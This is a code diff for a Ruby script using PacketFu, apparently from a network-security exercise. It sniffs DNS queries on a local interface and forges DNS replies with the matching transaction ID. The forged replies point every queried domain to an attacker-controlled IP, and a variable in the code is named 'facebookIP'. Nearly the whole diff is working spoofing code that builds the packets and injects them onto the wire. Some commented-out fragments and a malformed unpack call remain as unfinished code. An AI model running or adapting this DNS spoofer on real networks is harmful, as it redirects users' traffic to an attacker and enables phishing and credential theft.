@@ -7,7 +7,8 @@ require 'pp'
 
 include PacketFu
 
-iface = 'em1'
+$iface = 'em1'
+$attacker_ip = IPAddr.new '192.168.0.8'
 
 # Opens up the nic for capture.
 def sniff(iface)
@@ -20,6 +21,9 @@ def sniff(iface)
 
     if $dnsQuery == '10'
       domain, trans_id = get_info(packet)
+
+      #generate_spoofDNS(domain, trans_id, packet)
+      sendResponse(packet, domain)
     end
 
   end
@@ -45,7 +49,9 @@ def get_info(packet)
 
     # Add the letters to the domain
     while i < last
-      domain += packet.payload[i]
+      if packet.payload[i] != nil
+        domain += packet.payload[i]
+      end
       i += 1
     end
 
@@ -64,10 +70,90 @@ def get_info(packet)
       last = i + len.hex
     end
   end
-  pp packet.payload
-  transaction_id = '0x'+packet.payload[0].unpack('H*')[0]+packet.payload[1].unpack('H*')[0]
-  puts transaction_id
-  return domain, transaction_id.hex
+
+  puts "Spoofing to: " + domain
+
+
+  return domain
 end
 
-sniff(iface)
+def generate_spoofDNS(domain, transID, packet)
+  newDomain = split_domain(domain)+'\x00'
+
+#  attacker1 = $attacker_ip.split('.')
+  #attackerHex = [attacker1[0].to_i,attacker1[1].to_i,attacker1[2].to_i,attacker1[3].to_i].pack('c*')
+  pp "TransID: " + transID
+
+  udp_pkt = UDPPacket.new
+  udp_pkt.eth_saddr = packet.eth_daddr
+  udp_pkt.eth_daddr = packet.eth_saddr
+  udp_pkt.udp_dst = packet.udp_src
+  udp_pkt.udp_src = 53
+  udp_pkt.ip_saddr = packet.ip_daddr
+  udp_pkt.ip_daddr = packet.ip_saddr
+
+  udp_pkt.payload = transID +"\x81\x80".unpack('H') + $attacker_ip.hton
+
+
+  #udp_pkt.payload = transID+"\x81\x80".hex+"\x00\x01"+"\x00\x01"+"\x00\x00"+"\x00\x00"+"\x03\x77"+"\x77\x77"+"\x09\x77"+"\x69\x6b"+"\x69\x70"+"\x65\x64"+"\x69\x61"+"\x03\x6f"+"\x72\x67"+"\x00"
+  #udp_pkt.payload += "\x00\x01"+"\x00\x01"+"\xc0\x0c"+"\x00\x01"+"\x00\x01"+"\x00\x00"+"\x02\x58"
+  #udp_pkt.payload += "\x00\x04"+$attacker_ip.hton
+
+  pp "Payload: " + udp_pkt.payload
+
+end
+
+def sendResponse(packet, domainName)
+
+  # Convert the IP address
+  facebookIP = "192.168.0.8"
+  myIP = facebookIP.split(".");
+  myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')
+
+  # Create the UDP packet
+  response = UDPPacket.new
+  response.udp_src = packet.udp_dst
+  response.udp_dst = packet.udp_src
+  response.ip_saddr = packet.ip_daddr
+  response.ip_daddr = packet.ip_saddr
+  response.eth_daddr = packet.eth_saddr
+
+  # Transaction ID
+  response.payload = packet.payload[0,2]
+
+  response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"
+
+  # Domain name
+  domainName.split(".").each do |section|
+    response.payload += section.length.chr
+    response.payload += section
+  end
+
+  # Set more default values...........
+  response.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
+  response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00" + "\x04"
+
+  # IP
+  response.payload += myIP2
+
+  # Calculate the packet
+  response.recalc
+
+  # Send the packet out
+  response.to_w($iface)
+
+end
+
+def split_domain(domain)
+  split = domain.split('.')
+  newDomain = String.new
+  split.each { |s|
+    len = '%02X' % s.length
+    newDomain += '\\x' + len + s
+
+
+  }
+  return newDomain
+end
+
+sniff($iface)
